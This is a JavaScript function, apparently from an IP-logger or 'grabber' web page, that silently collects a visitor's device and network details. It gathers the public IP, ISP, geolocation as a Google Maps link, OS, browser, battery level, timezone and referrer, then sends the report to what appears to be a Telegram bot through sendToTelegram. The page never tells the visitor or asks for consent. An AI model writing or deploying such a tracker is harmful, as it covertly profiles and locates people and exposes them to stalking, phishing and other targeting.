function startDeviceInfo(config) {
  const ua = navigator.userAgent;
  const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const lang = navigator.language || navigator.userLanguage;
  const screenRes = `${screen.width} x ${screen.height}`;
  const ref = document.referrer || "Direct";
  const connection = navigator.connection || {};
  const network = connection.effectiveType || "Unknown";

  function detectOS(ua) {
    if (/android/i.test(ua)) return "Android";
    if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
    if (/windows/i.test(ua)) return "Windows";
    if (/macintosh|mac os/i.test(ua)) return "Mac";
    if (/linux/i.test(ua)) return "Linux";
    return "Unknown";
  }

  function detectBrowser(ua) {
    if (ua.includes("Firefox/")) return "Firefox";
    if (ua.includes("Edg/")) return "Edge";
    if (ua.includes("Chrome/")) return "Chrome";
    if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
    return "Unknown";
  }

  navigator.getBattery().then(battery => {
    const charging = battery.charging ? "Yes" : "No";
    const level = Math.round(battery.level * 100) + "%";

    fetch("https://ipinfo.io/json?token=demo")
      .then(res => res.json())
      .then(data => {
        let log = "✨ Device Info Captured\n\n";
        if (config.ipInfo) {
          log += "🌐 IP Info:\n";
          log += `IP: ${data.ip}\nISP: ${data.org}\nASN: ${data.org?.split(" ")[0]}\n`;
          log += `IP Location: https://maps.google.com/?q=${data.loc}\n\n`;
        }
        log += "💻 Device Details:\n";
        log += `OS: ${detectOS(ua)}\nBrowser: ${detectBrowser(ua)}\nDevice: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n`;
        if (config.screen) log += `Resolution: ${screenRes}\n`;
        if (config.lang) log += `Language: ${lang}\n`;
        log += `Network: ${network.toUpperCase()}\nBattery: ${level} (Charging: ${charging})\n`;
        log += `Timezone: ${timeZone}\n`;
        if (config.referrer) log += `Referrer: ${ref}\n`;
        log += `User Agent: ${ua}`;
        sendToTelegram(log);
      });
  });
}
